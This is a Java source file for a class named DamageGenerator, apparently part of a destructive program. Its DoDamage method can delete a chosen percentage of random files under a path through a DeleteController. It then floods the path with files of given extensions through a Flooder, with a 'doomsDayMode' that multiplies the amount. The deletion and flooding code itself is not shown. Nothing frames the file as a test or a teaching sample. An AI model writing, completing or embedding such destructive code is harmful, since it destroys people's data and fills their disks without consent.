
package com;

import java.io.File;

public class DamageGenerator {
	private static int damage, percent;
	private static String extensions[];
	private static File path;
	private static boolean random = false, doomsDayMode = false, delete = false;

	public DamageGenerator(int damage, File path, String extensions[], boolean random, int percent, boolean delete, boolean doomsday) {
		DamageGenerator.damage = damage;
		DamageGenerator.path = path;
		DamageGenerator.extensions = extensions;
		DamageGenerator.random = random;
		DamageGenerator.doomsDayMode = doomsday;
		DamageGenerator.delete = delete;
		DamageGenerator.percent = percent;
	}

	public DamageGenerator(int damage, File path, String extensions[]) {
		DamageGenerator.damage = damage;
		DamageGenerator.path = path;
		DamageGenerator.extensions = extensions;
	}

	public void DoDamage() {
		if (delete) {
			Deleting();
		}
		if (doomsDayMode) {
			damage *= (extensions.length + 1);
		}
		Flooder flooder = new Flooder(damage, path, extensions);
		if (random) {
			flooder.RandomFlood();
		} else {
			flooder.Flood();
		}

	}

	private static void Deleting() {
		DeleteController deleteController = new DeleteController(path, percent);
		deleteController.DeleteRandomStuff();
	}
}
